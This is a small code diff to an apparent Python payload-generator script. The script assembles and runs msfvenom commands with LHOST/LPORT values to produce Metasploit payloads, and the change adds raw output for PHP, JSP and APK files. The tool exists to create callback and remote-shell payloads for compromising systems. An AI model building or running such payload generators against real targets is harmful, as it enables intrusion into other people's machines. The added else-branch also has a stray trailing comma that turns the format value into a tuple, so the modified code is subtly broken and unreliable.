@@ -174,16 +174,21 @@ def generate_payload():
         # If the user did not provide an extension, use the default
         filename += f".{default_extension}"
 
+    if filename.endswith((".php", ".jsp", ".apk")):
+        filetype = f"raw"
+    else:
+        filetype = os.path.splitext(filename)[1].lstrip('.'),
+
     # Construct the msfvenom command
     msfvenom_command = [
         "msfvenom",
         "-p", payload,
         "LHOST={}".format(lhost),
         "LPORT={}".format(lport),
-        "-f", os.path.splitext(filename)[1].lstrip('.'),
+        "-f", filetype,
         "-o", filename
     ]
-
+    
     # Execute the msfvenom command
     print(f"\nGenerating: {' '.join(msfvenom_command)}\n")
     result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
